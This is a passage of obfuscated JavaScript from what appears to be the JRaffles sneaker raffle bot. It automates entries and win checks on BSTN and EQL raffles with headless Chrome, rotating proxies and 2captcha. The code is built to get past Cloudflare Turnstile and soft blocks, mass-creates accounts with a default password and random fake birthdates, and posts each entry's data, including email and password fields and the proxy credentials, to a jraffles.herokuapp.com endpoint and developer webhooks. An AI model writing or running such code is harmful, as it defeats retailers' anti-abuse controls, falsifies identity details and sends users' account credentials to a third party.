                                            await _0x4e72fc['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x4a90c0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x80c269 = await _0x4a90c0['$']('#turnstile-wrapper');
                                        if (_0x80c269)
                                            try {
                                                await _0x80c269['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x4a90c0['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x48c336['send']('Browser.setWindowBounds', {
                                    'windowId': _0x347e05,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x289b0b(0x1388), await _0x4a90c0['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4a90c0['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x289b0b(0x1f4), console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4a90c0['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x59a1d9 => _0x59a1d9['click']()), await _0x4a90c0['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4a90c0['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x289b0b(0x7d0), await _0x4a90c0['waitForSelector']('#email-login'), await _0x4a90c0['type']('#email-login', '' + _0x4e62b5[_0x5efa34]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x289b0b(0xdac), await _0x4a90c0['waitForSelector']('#password'), await _0x4a90c0['type']('#password', '' + _0x4e62b5[_0x5efa34]['Password'], { 'delay': 0xe6 }), await _0x289b0b(0x157c);
                                try {
                                    await _0x4a90c0['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4c6f39 => _0x4c6f39['click']());
                                } catch {
                                }
                                try {
                                    await _0x4a90c0['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0xe8db65) {
                                }
                                await _0x289b0b(0x3e8);
                                const _0x42bfc1 = await _0x4a90c0['$']('.enteredDraw_container__2KmQ_');
                                if (_0x42bfc1) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4e62b5[_0x5efa34]['Size']);
                                try {
                                    if (_0x4e62b5[_0x5efa34]['Size'] != 'RANDOM') {
                                        var _0x3246ad = _0x4e62b5[_0x5efa34]['Size']['replace']('.', ',');
                                        const _0x7bf86d = await _0x4a90c0['$x']('//div[contains(text(),\x20\x27' + _0x3246ad + '\x27)]');
                                        await _0x7bf86d[0x0]['click']();
                                    } else {
                                        const _0x2c795e = await _0x4a90c0['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x9df702 = Math['round'](Math['random']() * (_0x2c795e['length'] - 0x1));
                                        await _0x2c795e[_0x9df702]['click']();
                                    }
                                } catch (_0x5b8803) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x289b0b(0x1f4);
                                const _0x2d2d00 = await _0x4a90c0['$']('.addressList_addressItem__LE2PB');
                                if (_0x2d2d00 && _0x4e62b5[_0x5efa34]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x4a90c0['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x289b0b(0x5dc), await _0x4a90c0['waitForSelector']('#firstname'), await _0x4a90c0['type']('#firstname', '' + _0x4e62b5[_0x5efa34]['FirstName']), await _0x289b0b(0x1f4), await _0x4a90c0['waitForSelector']('#firstname'), await _0x4a90c0['type']('#lastname', '' + _0x4e62b5[_0x5efa34]['LastName']), await _0x289b0b(0x1f4), await _0x4a90c0['waitForSelector']('#firstname'), await _0x4a90c0['type']('#street', '' + _0x4e62b5[_0x5efa34]['Address1']), await _0x289b0b(0x1f4), await _0x4a90c0['waitForSelector']('#firstname'), await _0x4a90c0['type']('#houseNumber', _0x4e62b5[_0x5efa34]['HouseNumber'] + '\x20' + _0x4e62b5[_0x5efa34]['Address2']), await _0x289b0b(0x1f4), await _0x4a90c0['waitForSelector']('#firstname'), await _0x4a90c0['select']('#country_code', '' + _0x4e62b5[_0x5efa34]['Country']), await _0x289b0b(0x1f4), await _0x4a90c0['type']('#postcode', '' + _0x4e62b5[_0x5efa34]['Zip']), await _0x289b0b(0x1f4), await _0x4a90c0['type']('#city', '' + _0x4e62b5[_0x5efa34]['City']), await _0x289b0b(0x1f4), await _0x4a90c0['type']('#telephone', '' + _0x4e62b5[_0x5efa34]['Phone']), await _0x289b0b(0x1f4), await _0x4a90c0['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x289b0b(0x9c4);
                                try {
                                    await _0x4a90c0['type']('#instagram_name', '' + _0x4e62b5[_0x5efa34]['Follower']), await _0x4a90c0['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x289b0b(0x5dc);
                                try {
                                    await _0x4a90c0['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x289b0b(0x5dc), await _0x4a90c0['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4c187d => _0x4c187d['click']()), await _0x289b0b(0x1388);
                                try {
                                    await _0x4a90c0['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x4a90c0['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x4e62b5[_0x5efa34]['Size'] != 'RANDOM') {
                                        var _0x3246ad = _0x4e62b5[_0x5efa34]['Size']['replace']('.', ',');
                                        const _0x329838 = await _0x4a90c0['$x']('//div[contains(text(),\x20' + _0x3246ad + ')]');
                                        await _0x329838[0x0]['click']();
                                    } else {
                                        const _0x354543 = await _0x4a90c0['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x9df702 = Math['round'](Math['random']() * (_0x354543['length'] - 0x1));
                                        await _0x354543[_0x9df702]['click']();
                                    }
                                    await _0x289b0b(0x5dc);
                                    try {
                                        await _0x4a90c0['hover']('#instagram_name'), await _0x4a90c0['type']('#instagram_name', '' + _0x4e62b5[_0x5efa34]['Follower']), await _0x4a90c0['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Retrying\x20(' + _0x44aa07 + '\x20/\x205)');
                                    try {
                                        await _0x4a90c0['hover']('.checkBox_boxHolder__wLGVe'), await _0x289b0b(0x5dc), await _0x4a90c0['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x289b0b(0x157c), await _0x4a90c0['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5df973 => _0x5df973['click']()), await _0x289b0b(0x1388), await _0x4a90c0['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x5d9105 = 'no', _0x53c50d(_0x4e62b5[_0x5efa34], _0x4b0958);
                                try {
                                    prxdata = {
                                        'username': _0x2e53d0['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x25da7e),
                                        'proxy': '' + _0x561a24[_0x5efa34]
                                    };
                                    var _0x3ef20c = JSON['stringify'](prxdata);
                                    let _0x45d6b5 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x3ef20c, _0x45d6b5);
                                } catch (_0x5e941d) {
                                }
                                console['log'](_0x1ac777['green'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x506a98 = await _0x117512(_0x4e62b5[_0x5efa34], _0x4b0958, 'dev', ![]), _0x5a82ce = await _0x117512(_0x4e62b5[_0x5efa34], _0x4b0958, 'pub', ![]);
                                const _0x3aa94a = {
                                    'succesDEVMSG': { 'embeds': [_0x506a98] },
                                    'succesPUBMSG': { 'embeds': [_0x5a82ce] }
                                };
                                let _0x25da7e = _0x4e62b5[_0x5efa34];
                                try {
                                    prxdata = {
                                        'username': _0x2e53d0['replace']('#', ''),
                                        'module': _0x4b0958['name'],
                                        'entrydata': JSON['stringify'](_0x25da7e),
                                        'proxy': '' + _0x561a24[_0x5efa34]
                                    };
                                    var _0x3ef20c = JSON['stringify'](prxdata);
                                    let _0xd98d0c = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x500c10['post']('https://jraffles.herokuapp.com/success', _0x3ef20c, _0xd98d0c);
                                } catch (_0x1bed17) {
                                }
                                try {
                                    _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x3aa94a['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x59432e, _0x3aa94a['succesDEVMSG']), await _0x289b0b(0xc8), await _0x15c654(_0x1d7baa, _0x3aa94a['succesPUBMSG']);
                                } catch (_0xa83e5d) {
                                    console['log'](_0x1ac777['yellow'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xa83e5d));
                                }
                            } catch (_0x1c3c59) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20' + _0x1c3c59)), _0x5d9105 = 'yes', _0x34ed08 = '' + _0x1c3c59;
                                var _0x468759 = await _0x117512(_0x4e62b5[_0x5efa34], _0x4b0958, 'dev', !![], _0x34ed08), _0x506a98 = await _0x117512(_0x4e62b5[_0x5efa34], _0x4b0958, 'dev', ![]), _0x5a82ce = await _0x117512(_0x4e62b5[_0x5efa34], _0x4b0958, 'pub', ![]);
                                const _0x1b62d2 = {
                                    'succesDEVMSG': { 'embeds': [_0x506a98] },
                                    'succesPUBMSG': { 'embeds': [_0x5a82ce] }
                                };
                                _0x1b62d2['errorDEV'] = { 'embeds': [_0x468759] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x1b62d2['errorDEV']), await _0x15c654(_0x34ab86, _0x1b62d2['errorDEV']);
                            } finally {
                                _0x92f012 && _0x92f012['close']();
                                if (_0x5d9105 == 'yes' && _0x44aa07 != 0x5)
                                    return console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Task\x20' + (_0x5efa34 + 0x1) + '\x20:\x20Retrying\x20(' + _0x44aa07 + '\x20/\x205)')), _0x44aa07 = _0x44aa07 + 0x1, _0x430efc--, _0x2dd207(_0x4b0958, _0x4e62b5, _0x561a24, _0x5efa34, _0x44aa07);
                                _0x5d9105 == 'yes' && _0x44aa07 >= 0x5 && _0x5f4429(_0x4e62b5[_0x5efa34], _0x4b0958), !_0xb3e96f && (console['log'](_0x3d201d() + '\x20[' + _0x4b0958['name'] + ']\x20Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay'])), _0x430efc--;
                            }
                        }
                        _0x2dd207(_0x432c0c, _0x4f81e9, _0x460d30, _0x2f29c9, 0x0), await _0x289b0b(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4f125e, _0x26ab7e) {
                    var _0x7b4f55 = 0x0, _0x322d2b;
                    try {
                        const _0x19382d = _0x457b0a['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x322d2b = _0x1b57da['parse'](_0x19382d, { 'header': !![] })['data'];
                    } catch (_0x520b50) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x540797 = 0x0; _0x540797 < _0x322d2b['length']; _0x540797++) {
                        maxTasks = Number(_0x79d23a['threads']);
                        while (_0x7b4f55 >= maxTasks) {
                            await _0x289b0b(_0x79d23a['delay']);
                        }
                        async function _0xb9643a(_0x15bb5f, _0x3ae1a2, _0x5f5136, _0x134f36, _0x58e158) {
                            _0x7b4f55++, _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x79d23a['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x212634 != 'yes')
                                var _0x212634 = '', _0x58e158 = 0x0;
                            var _0x3cdc81;
                            _0x25b0b6(_0x15bb5f['name'] + '\x20Task\x20' + (_0x134f36 + 0x1) + '\x20/\x20' + _0x5f5136['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                            var _0x22bfdf = await _0x117512(_0x5f5136[_0x134f36], _0x15bb5f, 'acc', ![]);
                            const _0x2347e7 = { 'succesDEVMSG': { 'embeds': [_0x22bfdf] } }, _0x5f3d74 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x48ece8 = Math['round'](Math['random']() * (_0x3ae1a2['length'] - 0x1)), _0x81216 = _0x3ae1a2[_0x48ece8]['split'](':'), _0x5afc99;
                            try {
                                _0x5afc99 = await _0x2926d5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x81216[0x0] + ':' + _0x81216[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x5afc99 = await _0x2926d5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x81216[0x0] + ':' + _0x81216[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20Checking\x20' + _0x5f5136[_0x134f36]['Email']);
                                const _0x24a9e0 = await _0x5afc99['newPage']();
                                await _0x24a9e0['authenticate']({
                                    'username': '' + _0x81216[0x2],
                                    'password': '' + _0x81216[0x3]
                                }), console['log'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x24a9e0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x24a9e0['setRequestInterception'](!![]), _0x24a9e0['on']('request', _0x19ebf5 => {
                                    _0x19ebf5['resourceType']() === 'image' ? _0x19ebf5['abort']() : _0x19ebf5['continue']();
                                });
                                try {
                                    await _0x24a9e0['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x24a9e0['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x212634 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x24a9e0['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x289b0b(0x3e8), await _0x24a9e0['type']('#email', _0x5f5136[_0x134f36]['Email']), await _0x289b0b(0x1f4), await _0x24a9e0['type']('#pass', _0x5f5136[_0x134f36]['Password']), await _0x289b0b(0x1f4), await _0x24a9e0['$eval']('#login-form', _0x40276b => _0x40276b['submit']());
                                try {
                                    await _0x24a9e0['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x289b0b(0x190);
                                const _0x29950e = await _0x24a9e0['evaluate'](() => {
                                    const _0x12720f = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x12720f['map'](_0x5ddae9 => _0x5ddae9['alt']);
                                }), _0x3c8b92 = await _0x24a9e0['evaluate'](() => {
                                    const _0x24019e = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x24019e['map'](_0x13db50 => _0x13db50['innerHTML']);
                                }), _0x3ad5bd = await _0x24a9e0['$$']('.raffle-winner');
                                if (_0x3ad5bd['length'] < 0x1) {
                                    console['log'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x212634 = 'no';
                                    return;
                                }
                                console['log'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20' + _0x3ad5bd['length'] + '\x20Wins\x20Found!');
                                for (var _0x1de1d9 = 0x0; _0x1de1d9 < _0x3ad5bd['length']; _0x1de1d9++) {
                                    console['log'](_0x1ac777['green'](_0x29950e[_0x1de1d9] + _0x3c8b92[_0x1de1d9]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x3d9ead) {
                                console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20' + _0x3d9ead)), _0x3cdc81 = '' + _0x3d9ead;
                                var _0x29fb8c = await _0x117512(_0x5f5136[_0x134f36], _0x15bb5f, 'acc', !![], _0x3cdc81);
                                _0x2347e7['errorDEV'] = { 'embeds': [_0x29fb8c] }, _0x79d23a['webhook'] != undefined && _0x79d23a['webhook'] != '' && await _0x15c654(_0x79d23a['webhook'], _0x2347e7['errorDEV']), await _0x15c654(_0x34ab86, _0x2347e7['errorDEV']), _0x212634 = 'yes';
                            } finally {
                                if (_0x5afc99)
                                    _0x5afc99['close']();
                                if (_0x212634 == 'yes' && _0x58e158 != 0x5)
                                    return console['log'](_0x1ac777['red'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Task\x20' + (_0x134f36 + 0x1) + '\x20:\x20Retrying\x20(' + _0x58e158 + '\x20/\x205)')), _0x7b4f55--, _0x58e158 = _0x58e158 + 0x1, _0xb9643a(_0x15bb5f, _0x3ae1a2, _0x5f5136, _0x134f36, _0x58e158);
                                _0x212634 == 'yes' && _0x58e158 >= 0x5 && (_0x5f4429(_0x5f5136[_0x134f36], _0x15bb5f), _0x212634 = 'no', _0x58e158 = 0x0), console['log'](_0x3d201d() + '\x20[' + _0x15bb5f['name'] + ']\x20Waiting\x20for\x20' + _0x79d23a['delay'] + '\x20ms'), await _0x289b0b(_0x79d23a['delay']), _0x7b4f55--;
                            }
                        }
                        _0xb9643a(_0x4f125e, _0x26ab7e, _0x322d2b, _0x540797, 0x0), await _0x289b0b(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0xe9195d, _0x5a4aed, _0x87caf8) {
                _0x2926d5['use'](_0x409c7d()), _0x2926d5['use'](_0x4a68ab({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x79d23a['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2eaf3d = 0x0; _0x2eaf3d < _0x5a4aed['length']; _0x2eaf3d++) {
                    var _0x24248c;
                    _0x25b0b6(_0xe9195d['name'] + '\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20/\x20' + _0x5a4aed['length'] + '\x20||\x20File:\x20' + _0x273bbf + '\x20Proxies:\x20' + _0x11770e);
                    try {
                        await _0x5af4d5(_0x5a4aed, _0x2eaf3d);
                    } catch {
                        _0x123c9c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x46950d(_0x56b6c0) {
                        const _0x182628 = _0x457b0a['readFileSync']('../successful-tasks.csv', 'utf8'), _0x467da7 = _0x1b57da['parse'](_0x182628, { 'header': !![] })['data'];
                        let _0x35c12a = ![];
                        for (var _0x56f662 of _0x467da7) {
                            if (_0x56f662['Url'] == _0x56b6c0['Url'] && _0x56f662['Email'] == _0x56b6c0['Email']) {
                                _0x35c12a = !![];
                                break;
                            }
                        }
                        return _0x35c12a;
                    }
                    if (await _0x46950d(_0x5a4aed[_0x2eaf3d]) == !![]) {
                        console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x1a8d20 = ![];
                    const _0x120da0 = _0x457b0a['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x4f9456 = _0x1b57da['parse'](_0x120da0, { 'header': !![] })['data'];
                    for (var _0x2977a8 of _0x4f9456) {
                        _0x2977a8['Email'] == _0x5a4aed[_0x2eaf3d]['Email'] && (_0x1a8d20 = !![]);
                    }
                    if (_0x1a8d20 == ![]) {
                        var _0x471a94;
                        if (_0x5a4aed[_0x2eaf3d]['Url']['endsWith']('/')) {
                            _0x471a94 = _0x5a4aed[_0x2eaf3d]['Url'] + 'register';
                            if (_0x123c9c != 'yes')
                                var _0x123c9c = '', _0x221e41 = 0x0;
                        } else {
                            _0x471a94 = _0x5a4aed[_0x2eaf3d]['Url'] + '/register';
                            if (_0x123c9c != 'yes')
                                var _0x123c9c = '', _0x221e41 = 0x0;
                        }
                        if (_0x5a4aed[_0x2eaf3d]['Email'] == '' || _0x5a4aed[_0x2eaf3d]['FirstName'] == '' || _0x5a4aed[_0x2eaf3d]['LastName'] == '') {
                            console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5a4aed[_0x2eaf3d]['Password'] == '' && (_0x5a4aed[_0x2eaf3d]['Password'] = 'JRaffles23!');
                        if (_0x79d23a['useRandomProxy'] = ![])
                            var _0xfa8399 = _0x87caf8[_0x2eaf3d]['split'](':');
                        else
                            var _0x3bbcb2 = Math['round'](Math['random']() * (_0x87caf8['length'] - 0x1)), _0xfa8399 = _0x87caf8[_0x3bbcb2]['split'](':');
                        var _0x5a0166;
                        try {
                            _0x5a0166 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xfa8399[0x0] + ':' + _0xfa8399[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5a0166 = await _0x2926d5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xfa8399[0x0] + ':' + _0xfa8399[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1f45df = await _0x5a0166['newPage']();
                            await _0x1f45df['authenticate']({
                                'username': '' + _0xfa8399[0x2],
                                'password': '' + _0xfa8399[0x3]
                            }), console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1f45df['setRequestInterception'](!![]), _0x1f45df['on']('request', _0x1c2b21 => {
                                _0x1c2b21['resourceType']() === 'image' || _0x1c2b21['resourceType']() === 'font' || _0x1c2b21['resourceType']() === 'media' ? _0x1c2b21['abort']() : _0x1c2b21['continue']();
                            });
                            try {
                                await _0x1f45df['goto']('' + _0x471a94);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x289b0b(0x3e8), await _0x1f45df['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x1f45df['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x289b0b(0x3e8), _0x5a4aed[_0x2eaf3d]['Url']['includes']('en-GB') ? await _0x1f45df['click']('li[data-value=\x22UK\x20' + _0x5a4aed[_0x2eaf3d]['Size'] + '\x20/\x20US\x20' + (Number(_0x5a4aed[_0x2eaf3d]['Size']) + 0x1) + '\x22]') : await _0x1f45df['click']('li[data-value=\x22EU\x20' + _0x5a4aed[_0x2eaf3d]['Size'] + '\x22]');
                                } catch {
                                    await _0x1f45df['click']('#productQuantity'), await _0x289b0b(0x3e8), await _0x1f45df['click']('li[data-value=\x22' + (Number(_0x5a4aed[_0x2eaf3d]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x5a4aed[_0x2eaf3d]['Size']);
                            }
                            await _0x289b0b(0x6a4);
                            try {
                                await _0x1f45df['select']('.PhoneInputCountrySelect', _0x5a4aed[_0x2eaf3d]['Country']);
                            } catch {
                            }
                            await _0x1f45df['type']('#email', '' + _0x5a4aed[_0x2eaf3d]['Email']), await _0x289b0b(0x352), await _0x1f45df['waitForSelector']('#password'), await _0x1f45df['type']('#password', '' + _0x5a4aed[_0x2eaf3d]['Password']), await _0x289b0b(0x352), await _0x1f45df['type']('#phone', '' + _0x5a4aed[_0x2eaf3d]['Phone']), await _0x289b0b(0x352);
                            const _0x52b524 = await _0x1f45df['$']('#title\x20>\x20label');
                            await _0x289b0b(0x12c);
                            _0x52b524 && await _0x52b524['click']();
                            await _0x1f45df['type']('#firstName', '' + _0x5a4aed[_0x2eaf3d]['FirstName']), await _0x289b0b(0x352), await _0x1f45df['type']('#lastName', '' + _0x5a4aed[_0x2eaf3d]['LastName']), await _0x289b0b(0x352);
                            _0x5a4aed[_0x2eaf3d]['Url']['includes']('footlocker.de') ? await _0x1f45df['type']('#birthdate', _0xa85770(0xa, 0x1c) + '.' + _0xa85770(0xa, 0xc) + '.' + _0xa85770(0x7c6, 0x7d3)) : await _0x1f45df['type']('#birthdate', _0xa85770(0xa, 0x1c) + '-' + _0xa85770(0xa, 0xc) + '-' + _0xa85770(0x7c6, 0x7d3));
                            await _0x289b0b(0x352), await _0x1f45df['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x5a4aed[_0x2eaf3d]['Url']['includes']('en-GB') && await _0x1f45df['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x289b0b(0x1f4), await _0x289b0b(0x5dc);
                            if (!_0x471a94['includes']('footlocker'))
                                try {
                                    await _0x1f45df['click']('#country');
                                    const _0x4c1f0c = await _0x1f45df['$']('li[data-value=\x22' + _0x5a4aed[_0x2eaf3d]['Country'] + '\x22]');
                                    await _0x4c1f0c['click'](), await _0x4c1f0c['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x289b0b(0x3e8);
                            if (!_0x5a4aed[_0x2eaf3d]['Url']['includes']('en-GB')) {
                                await _0x1f45df['click']('#stateAutocomplete'), await _0x289b0b(0x5dc);
                                try {
                                    const _0x4792c8 = await _0x1f45df['$x']('//li[text()=\x22' + _0x5a4aed[_0x2eaf3d]['State'] + '\x22]');
                                    await _0x4792c8[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x3d201d() + '\x20[' + _0xe9195d['name'] + ']\x20Task\x20' + (_0x2eaf3d + 0x1) + '\x20:\x20Setting\x20Address'), await _0x289b0b(0x3e8), await _0x289b0b(0x1f4);
                            if (_0x5a4aed[_0x2eaf3d]['Url']['includes']('topps')) {
                                await _0x1f45df['click']('#stateAutocomplete'), await _0x289b0b(0x5dc);
                                try {
